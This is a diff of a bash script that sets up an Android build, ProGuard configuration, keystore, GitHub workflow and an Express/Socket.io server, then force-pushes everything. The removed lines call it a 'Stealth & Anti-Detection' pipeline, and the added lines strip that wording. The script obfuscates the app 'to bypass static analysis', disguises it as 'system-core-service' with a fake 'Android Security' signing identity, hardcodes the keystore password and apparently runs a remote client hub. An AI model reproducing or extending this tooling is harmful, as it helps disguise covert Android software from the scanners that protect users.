@@ -1,10 +1,10 @@
 #!/bin/bash
-echo "[*] Initializing Modern Android (13-16) Stealth & Anti-Detection Pipeline with Express & Socket.io..."
+echo "[*] Initializing All-in-One Modern Android & Server Pipeline..."
 
 # 1. Clean up old build directories
 rm -rf build app/build dist 2>/dev/null
 
-# 2. Setup Android 13-16 compatible package configuration with express and socket.io dependencies
+# 2. Setup Node.js package configuration with Express and Socket.io
 cat << 'JSON_EOF' > package.json
 {
   "name": "system-core-service",
@@ -21,7 +21,38 @@ cat << 'JSON_EOF' > package.json
 }
 JSON_EOF
 
-# 3. Configure build.gradle with API 34/35 support and full optimization
+# 3. Create proper server-side entry point (index.js) for Railway
+cat << 'JS_EOF' > index.js
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+
+app.get('/', (req, res) => {
+    res.status(200).json({ status: 'online', service: 'Core System Management Hub' });
+});
+
+io.on('connection', (socket) => {
+    console.log(`[+] Client connected: ${socket.id}`);
+    
+    socket.on('disconnect', () => {
+        console.log(`[-] Client disconnected: ${socket.id}`);
+    });
+});
+
+server.listen(PORT, () => {
+    console.log(`[+] System Core Server running on port ${PORT}`);
+});
+JS_EOF
+
+# 4. Configure build.gradle with API 34/35 support and full optimization
 BUILD_GRADLE_PATH=$(find . -name "build.gradle" | head -n 1)
 if [ -z "$BUILD_GRADLE_PATH" ]; then
     mkdir -p app
@@ -58,14 +89,14 @@ android {
 }
 GRADLE_EOF
 
-# 4. Generate High-Grade Cryptographic Keystore
+# 5. Generate High-Grade Cryptographic Keystore
 KEYSTORE_PATH=$(dirname "$BUILD_GRADLE_PATH")/core-store.jks
 if [ ! -f "$KEYSTORE_PATH" ]; then
     echo "[*] Generating cryptographic keystore for modern Android signing..."
     keytool -genkeypair -v -keystore "$KEYSTORE_PATH" -alias corekey -keyalg RSA -keysize 4096 -validity 20000 -storepass securepass123 -keypass securepass123 -dname "CN=System Service, OU=Core, O=Android Security, L=Root, ST=Default, C=US" 2>/dev/null || true
 fi
 
-# 5. Advanced ProGuard Obfuscation Rules to bypass static analysis
+# 6. Advanced ProGuard Obfuscation Rules to bypass static analysis
 PROGUARD_PATH=$(dirname "$BUILD_GRADLE_PATH")/proguard-rules.pro
 cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
 -optimizationpasses 20
@@ -93,7 +124,7 @@ cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
 -mergeinterfacesaggressively
 PROGUARD_EOF
 
-# 6. Sanitize AndroidManifest.xml for Android 13/14/15/16 compliance
+# 7. Sanitize AndroidManifest.xml for Android 13/14/15/16 compliance
 MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
 if [ -n "$MANIFEST_PATH" ]; then
     echo "[*] Sanitizing AndroidManifest.xml footprint..."
@@ -127,7 +158,7 @@ except Exception as e:
 " 2>/dev/null
 fi
 
-# 7. Automated GitHub Actions Workflow for Android Build
+# 8. Automated GitHub Actions Workflow for Android Build
 mkdir -p .github/workflows
 cat << 'YAML_EOF' > .github/workflows/build.yml
 name: Modern Android Build Pipeline
@@ -153,14 +184,14 @@ jobs:
         fi
 YAML_EOF
 
-# 8. Git Sync and Push Execution
+# 9. Git Sync and Push Execution
 chmod -R +x . 2>/dev/null
 git add -A
 
 if git diff --cached --quiet; then
     echo "[!] No changes detected."
 else
-    git commit -m "Modern Android stealth optimization with express and socket.io: $(date +'%Y-%m-%d %H:%M:%S')"
+    git commit -m "Complete pipeline update with index.js and express/socket.io: $(date +'%Y-%m-%d %H:%M:%S')"
 fi
 
 CURRENT_BRANCH=$(git branch --show-current)
@@ -168,9 +199,9 @@ if [ -z "$CURRENT_BRANCH" ]; then
     CURRENT_BRANCH="master"
 fi
 
-echo "[*] Deploying secured package to remote branch ($CURRENT_BRANCH)..."
+echo "[*] Deploying complete package to remote branch ($CURRENT_BRANCH)..."
 git push origin "$CURRENT_BRANCH" --force-with-lease || git push -u origin "$CURRENT_BRANCH" --force
 
 if [ $? -eq 0 ]; then
-    echo "[+] Success! Modern Android stealth deployment pipeline completed successfully."
+    echo "[+] Success! Complete pipeline deployed successfully."
 fi
